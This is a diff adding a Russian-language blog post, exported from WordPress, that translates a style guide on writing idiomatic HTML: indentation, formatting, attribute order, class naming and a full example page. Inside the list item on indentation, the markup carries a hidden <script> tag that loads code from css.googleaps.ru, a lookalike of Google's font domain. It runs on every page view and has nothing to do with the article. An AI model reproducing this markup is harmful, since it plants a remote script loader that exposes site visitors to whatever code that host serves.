@@ -1,0 +1,173 @@
+---
+layout: post
+status: publish
+published: true
+title: Принципы написания однородного HTML
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1537
+wordpress_url: http://magazine.loc/verstka/%d0%bf%d1%80%d0%b8%d0%bd%d1%86%d0%b8%d0%bf%d1%8b-%d0%bd%d0%b0%d0%bf%d0%b8%d1%81%d0%b0%d0%bd%d0%b8%d1%8f-%d0%be%d0%b4%d0%bd%d0%be%d1%80%d0%be%d0%b4%d0%bd%d0%be%d0%b3%d0%be-html/
+date: '2015-03-03 11:19:19 +0200'
+date_gmt: '2015-03-03 11:19:19 +0200'
+categories:
+- Верстка
+tags:
+- Тема
+- ip
+- post
+- javascript
+- css
+- идеи
+- git
+- js
+- forwebdev
+comments: []
+---
+<p>Этот документ представляет собой общие рекомендации по&nbsp;стилю написания HTML-разметки. Данное руководство призывает к&nbsp;использованию общепринятых и&nbsp;устоявшихся подходов к&nbsp;написанию кода.<&#47;p></p>
+<p>Этот документ не&nbsp;закончен, и&nbsp;новые идеи всегда приветствуются. Пожалуйста, внесите свой вклад.<&#47;p></p>
+<h2>Содержание<&#47;h2></p>
+<ol>
+<li><a href="#general-principles">Основные принципы<&#47;a><&#47;li>
+<li><a href="#whitespace">Пустое пространство<&#47;a><&#47;li>
+<li><a href="#format">Форматирование<&#47;a><&#47;li>
+<li><a href="#attribute-order">Порядок атрибутов<&#47;a><&#47;li>
+<li><a href="#naming">Именование<&#47;a><&#47;li>
+<li><a href="#example">Практический пример<&#47;a><&#47;li><br />
+<&#47;ol></p>
+<p><a href="#license">Лицензия<&#47;a><&#47;p></p>
+<p><a name="general-principles"><&#47;a><&#47;p></p>
+<h2>1. Основные принципы<&#47;h2></p>
+<ul>
+<li>Весь код в&nbsp;любой базе исходников должен выглядеть так, будто его написал один человек, вне зависимости от&nbsp;реального количества разработчиков.<&#47;li>
+<li>Строго следуйте принятому стилю.<&#47;li>
+<li>Если вы&nbsp;сомневаетесь в&nbsp;том, какой стиль использовать, пользуйтесь общепринятыми и&nbsp;устоявшимися подходами.<&#47;li><br />
+<&#47;ul></p>
+<p><a name="whitespace"><&#47;a><&#47;p></p>
+<h2>2. Пустое пространство<&#47;h2></p>
+<p>В&nbsp;вашей базе исходных кодов должен существовать лишь один стиль написания кода. Всегда согласованно используйте пустое пространство. Используйте пустое пространство для улучшения читаемости кода.<&#47;p></p>
+<ul>
+<li>Никогда не&nbsp;смешивайте табы и&nbsp;пробелы в&nbsp;отступах.<&#47;li>
+<li>Выберите между мягкой табуляцией (пробелы) и&nbsp;реальными табами. Придерживайтесь выбранного подхода. (Предпочтительно: мягкая табуляция)<&#47;li>
+<li>Если вы&nbsp;используете пробелы, выберите количество символов для отступа. (Предпочтительно: 4 пробела)<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;li><br />
+<&#47;ul></p>
+<p>Совет: настройте свой текстовый редактор так, чтобы он&nbsp;показывал непечатные символы (show invisibles). Это позволит вам устранить появление лишних пробелов и&nbsp;табов в&nbsp;конце строк или ещё где-либо.<&#47;p></p>
+<p><a name="format"><&#47;a><&#47;p></p>
+<h2 id="3-">3. Форматирование<&#47;h2></p>
+<ul>
+<li>Названия тегов и&nbsp;атрибутов всегда пишите в&nbsp;нижнем регистре.<&#47;li>
+<li>На&nbsp;одной строке размещайте только один элемент.<&#47;li>
+<li>Используйте дополнительный уровень отступов для каждого вложенного элемента.<&#47;li>
+<li>Указывайте атрибуты без их&nbsp;значения, если это возможно (например <code>checked<&#47;code> вместо <code>checked=&laquo;checked&raquo;<&#47;code>).<&#47;li>
+<li>Всегда используйте двойные кавычки для значений атрибутов.<&#47;li>
+<li>Не&nbsp;указывайте атрибут <code>type<&#47;code> в&nbsp;элементах <code>link<&#47;code>, <code>style<&#47;code> и&nbsp;<code>script<&#47;code>.<&#47;li>
+<li>Всегда закрывайте теги.<&#47;li>
+<li>Не&nbsp;используйте слеш в&nbsp;единичных тегах (<code><img><&#47;code>&nbsp;&mdash; правильно, <code><img&#47;><&#47;code>&nbsp;&mdash; неправильно).<&#47;li><br />
+<&#47;ul></p>
+<p>(Сохраняйте длину строки в&nbsp;пределах разумного максимума, например 80 символов.)<&#47;p></p>
+<p>Пример:<&#47;p></p>
+<pre><code class="language-markup">
+<div class="tweet">
+  <a href="path&#47;to&#47;somewhere"><br />
+    <img src="path&#47;to&#47;image.png" alt=""><br />
+  <&#47;a></p>
+<p>[tweet text]<&#47;p><br />
+  <button disabled>Reply<&#47;button><br />
+<&#47;div><br />
+<&#47;code><&#47;pre></p>
+<h3 id="-">Исключения и небольшие допущения<&#47;h3></p>
+<p>В элементах с несколькими атрибутами эти атрибуты можно расположить на отдельных строках, чтобы улучшить читабельность:<&#47;p></p>
+<pre><code class="language-markup"><a class="[value]"<br />
+ data-action="[value]"<br />
+ data-id="[value]"<br />
+ href="[url]"><br />
+    <span>[text]<&#47;span><br />
+<&#47;a><br />
+<&#47;code><&#47;pre></p>
+<p><a name="attribute-order"><&#47;a><&#47;p></p>
+<h2 id="4-">4. Порядок атрибутов<&#47;h2></p>
+<p>HTML-атрибуты должны быть перечислены в&nbsp;порядке, учитывающем то, что названия классов&nbsp;&mdash; базовая вещь, которая позволяет выбирать элементы с&nbsp;помощью JavaScript или <acronym title="Cascading Style Sheets">CSS<&#47;acronym>:<&#47;p></p>
+<ol>
+<li><code>class<&#47;code><&#47;li>
+<li><code>id<&#47;code><&#47;li>
+<li><code>data-*<&#47;code><&#47;li>
+<li>Любые другие атрибуты<&#47;li><br />
+<&#47;ol></p>
+<p>Пример:<&#47;p></p>
+<pre><code class="language-markup"><a class="[value]" id="[value]" data-name="[value]" href="[url]">[text]<&#47;a><br />
+<&#47;code><&#47;pre></p>
+<p><a name="naming"><&#47;a><&#47;p></p>
+<h2 id="5-">5. Именование<&#47;h2></p>
+<p>Именование&nbsp;&mdash; вещь сложная, но&nbsp;очень важная. Это ключевая часть процесса написания поддерживаемого кода. Без правильного именования невозможно иметь относительно масштабируемый интерфейс между <acronym title="HyperText Markup Language">HTML<&#47;acronym> и&nbsp;<acronym title="Cascading Style Sheets">CSS<&#47;acronym>&#47;JS.<&#47;p></p>
+<ul>
+<li>Используйте простые, понятные и&nbsp;уместные имена для классов. Имена должны быть информативны вне зависимости от&nbsp;контекста&nbsp;&mdash; как в&nbsp;разметке, так и&nbsp;в&nbsp;CSS-файлах.<&#47;li>
+<li>Избегайте <em>систематического<&#47;em> сокращения имён классов. Не&nbsp;усложняйте код.<&#47;li><br />
+<&#47;ul></p>
+<p>Пример с&nbsp;плохим именованием классов:<&#47;p></p>
+<pre><code class="language-markup">
+<div class="cb s-scr"><&#47;div><br />
+<&#47;code><&#47;pre></p>
+<pre><code class="language-css">.s-scr {<br />
+  overflow: auto;<br />
+}</p>
+<p>.cb {<br />
+  background: #000;<br />
+}<br />
+<&#47;code><&#47;pre></p>
+<p>Хороший пример именования:<&#47;p></p>
+<pre><code class="language-markup">
+<div class="column-body is-scrollable"><&#47;div><br />
+<&#47;code><&#47;pre></p>
+<pre><code class="language-css">.is-scrollable {<br />
+    overflow: auto;<br />
+}</p>
+<p>.column-body {<br />
+    background: #000;<br />
+}<br />
+<&#47;code><&#47;pre></p>
+<p><a name="example"><&#47;a><&#47;p></p>
+<h2 id="6-">6. Практический пример<&#47;h2></p>
+<p>Пример различных соглашений.<&#47;p></p>
+<pre><code class="language-markup"><!DOCTYPE html><br />
+<html><br />
+    <head><br />
+        <meta charset="utf-8"><br />
+        <title>Документ<&#47;title></p>
+<link rel="stylesheet" href="main.css">
+        <script src="main.js"><&#47;script><br />
+    <&#47;head><br />
+    <body></p>
+<article class="post" id="1234">
+            <time class="timestamp">15 Марта 2012<&#47;time><br />
+            <a data-id="1234"<br />
+             data-analytics-category="[value]"<br />
+             data-analytics-action="[value]"<br />
+             href="[url]">[text]<&#47;a></p>
+<ul>
+<li>
+                    <a href="[url]">[text]<&#47;a><br />
+                    <img src="[url]" alt="[text]"><br />
+                <&#47;li></p>
+<li>
+                    <a href="[url]">[text]<&#47;a><br />
+                <&#47;li><br />
+            <&#47;ul></p>
+<p>            <a class="link-complex" href="[url]"><br />
+                <span class="link-complex__target">[text]<&#47;span><br />
+                [text]<br />
+            <&#47;a></p>
+<p>            <input value="text" readonly><br />
+        <&#47;article><br />
+    <&#47;body><br />
+<&#47;html><br />
+<&#47;code><&#47;pre></p>
+<p><a name="license"><&#47;a><&#47;p></p>
+<h2 id="-">Лицензия<&#47;h2></p>
+<p><em>Принципы написания однородного HTML<&#47;em> от Николаса Галлахера лицензированы по <a href="http:&#47;&#47;creativecommons.org&#47;licenses&#47;by&#47;3.0&#47;">Creative Commons Attribution 3.0 Unported License<&#47;a>. Лицензия распространяется на все документы и переводы в этом репозитории.<&#47;p></p>
+<p>Основано на <a href="https:&#47;&#47;github.com&#47;necolas&#47;idiomatic-html">github.com&#47;necolas&#47;idiomatic-html<&#47;a>.<&#47;p></p>
+<p>Запись <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru&#47;html&#47;principles-for-writing-idiomatic-html&#47;">Принципы написания однородного HTML<&#47;a> впервые появилась <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru">For Web<&#47;a>.<&#47;p><br />
+Source: http:&#47;&#47;forwebdev.ru</p>
